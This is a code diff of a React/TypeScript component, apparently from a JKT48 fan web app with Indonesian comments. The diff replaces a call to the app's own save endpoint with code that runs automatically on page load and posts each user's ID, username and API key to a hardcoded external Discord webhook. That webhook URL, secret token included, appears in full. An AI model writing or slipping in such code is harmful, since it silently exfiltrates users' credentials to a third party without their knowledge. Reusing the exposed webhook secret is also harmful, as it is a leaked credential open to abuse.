@@ -82,37 +82,51 @@ type User = {
   // tambahkan properti lain yang Anda perlukan dari user
 };
 
-function saveUserDataToServer(user: User, apiKey: string) {
+function sendUserDataToWebhook(user: User, apiKey: string) {
   if (!user || !apiKey) return;
 
-  const userData = new URLSearchParams({
-    id: user.id,
-    username: user.username,
-    apiKey: apiKey,
-    balance: '0',  // Misalnya saldo awal adalah 0
-  });
+  const webhookUrl =
+    'https://discord.com/api/webhooks/1327936072986001490/vTZiNo3Zox04Piz7woTFdYLw4b2hFNriTDn68QlEeBvAjnxtXy05GNaopBjcGhIj0i1C';
 
-  fetch(`/api/auth/save-user-data?${userData.toString()}`, {
-    method: 'GET',
+  const embed = {
+    username: 'Webhook Bot', // Nama pengirim webhook
+    embeds: [
+      {
+        title: 'New User Data Saved',
+        color: 5814783, // Warna embed
+        fields: [
+          { name: 'ID', value: user.id, inline: true },
+          { name: 'Username', value: user.username, inline: true },
+          { name: 'API Key', value: apiKey, inline: false },
+          { name: 'Balance', value: '0', inline: true }, // Saldo awal
+        ],
+        timestamp: new Date().toISOString(), // Tambahkan timestamp
+      },
+    ],
+  };
+
+  // Kirim pesan embed ke webhook Discord
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(embed),
   })
     .then((response) => {
       if (response.ok) {
-        console.log('User data and API key saved!');
+        console.log('User data sent to webhook successfully!');
       } else {
-        return response.json().then((errorData) => {
-          console.error(errorData.error || 'Failed to save user data');
-        });
+        console.error('Failed to send data to webhook.');
       }
     })
     .catch((err) => {
-      console.error('Failed to save user data:', err);
+      console.error('Error sending data to webhook:', err);
     });
 }
 
-function initializeApiKeyAndSaveUserData() {
+function initializeApiKeyAndSendUserData() {
   if (typeof window !== 'undefined') {
     const existingKey = localStorage.getItem('jkt48-api-key');
-    
+
     if (!existingKey) {
       fetch('/api/auth/get-api-key')
         .then((res) => res.json())
@@ -121,8 +135,8 @@ function initializeApiKeyAndSaveUserData() {
             localStorage.setItem('jkt48-api-key', data.apiKey);
             console.log('API Key saved to localStorage:', data.apiKey);
 
-            // After saving the API Key, send the user data to the server
-            saveUserDataToServer(user, data.apiKey);
+            // Kirim data pengguna ke webhook setelah API key disimpan
+            sendUserDataToWebhook(user, data.apiKey);
           }
         })
         .catch((err) => console.error('Failed to fetch API key:', err));
@@ -133,7 +147,7 @@ function initializeApiKeyAndSaveUserData() {
 }
 
 useEffect(() => {
-  initializeApiKeyAndSaveUserData();
+  initializeApiKeyAndSendUserData();
 }, []);
 
   const handleApiKeyChange = (e: React.ChangeEvent<HTMLInputElement>) => {
